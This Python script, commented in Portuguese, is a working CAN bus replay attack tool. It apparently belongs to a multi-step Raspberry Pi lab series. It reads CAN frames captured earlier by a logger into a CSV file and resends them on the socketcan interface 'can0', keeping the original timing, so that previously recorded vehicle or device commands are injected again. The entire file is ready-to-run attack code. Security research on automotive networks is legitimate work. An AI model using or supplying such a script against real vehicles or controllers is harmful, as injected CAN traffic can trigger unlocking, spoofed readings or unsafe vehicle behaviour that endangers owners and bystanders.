import can
import csv
import time

# --- Parâmetros do Ataque de Replay ---

# Nome da interface CAN na Raspberry Pi.
CAN_INTERFACE = 'can0'

# Nome do arquivo CSV que contém a sequência de mensagens a ser repetida.
# Este arquivo deve ter sido gerado pelo can_logger.py na Etapa 1.
LOG_FILENAME = 'sequencia_para_replay.csv'

# --- Lógica do Ataque ---

def run_replay_attack():
    """
    Lê uma sequência de mensagens de um arquivo CSV e as reenvia
    para o barramento CAN, preservando o timing original entre elas.
    """
    print(f"Iniciando o Ataque de Replay a partir do arquivo '{LOG_FILENAME}'...")
    print(f"Interface: {CAN_INTERFACE}")

    bus = None
    try:
        # Inicializa a conexão com o barramento CAN
        bus = can.interface.Bus(channel=CAN_INTERFACE, bustype='socketcan')
        
        # Variável para armazenar o timestamp da mensagem anterior
        # para calcular o delay entre as mensagens.
        last_timestamp = None

        # Abre e lê o arquivo CSV
        with open(LOG_FILENAME, 'r') as csvfile:
            csv_reader = csv.reader(csvfile)
            next(csv_reader) # Pula a linha do cabeçalho

            print("Iniciando a retransmissão das mensagens...")
            for row in csv_reader:
                # Extrai os dados da linha do CSV
                timestamp = float(row[0])
                arbitration_id = int(row[1], 16) # Converte de Hex (string) para Int
                is_extended_id = row[2] == 'True'
                dlc = int(row[3])
                data = bytes.fromhex(row[4]) # Converte de Hex (string) para Bytes

                # Se esta não for a primeira mensagem, calcula o delay e espera
                if last_timestamp is not None:
                    delay = timestamp - last_timestamp
                    # Garante que o delay não seja negativo (caso o log não esteja ordenado)
                    if delay > 0:
                        time.sleep(delay)

                # Cria a mensagem CAN a partir dos dados lidos
                msg = can.Message(
                    arbitration_id=arbitration_id,
                    is_extended_id=is_extended_id,
                    dlc=dlc,
                    data=data
                )
                
                # Envia a mensagem para o barramento
                bus.send(msg)
                print(f"  Reenviado: ID={hex(arbitration_id)} Data={data.hex().upper()}", end='\r')

                # Atualiza o timestamp da última mensagem enviada
                last_timestamp = timestamp
        
        print("\n\n--- Ataque de Replay Finalizado ---")

    except FileNotFoundError:
        print(f"\nERRO: O arquivo '{LOG_FILENAME}' não foi encontrado.")
        print("Certifique-se de primeiro gravar uma sequência usando o can_logger.py.")
    except Exception as e:
        print(f"\nOcorreu um erro: {e}")

    finally:
        if bus:
            bus.shutdown()
            print("Conexão com o barramento CAN foi encerrada.")


if __name__ == "__main__":

    run_replay_attack()
    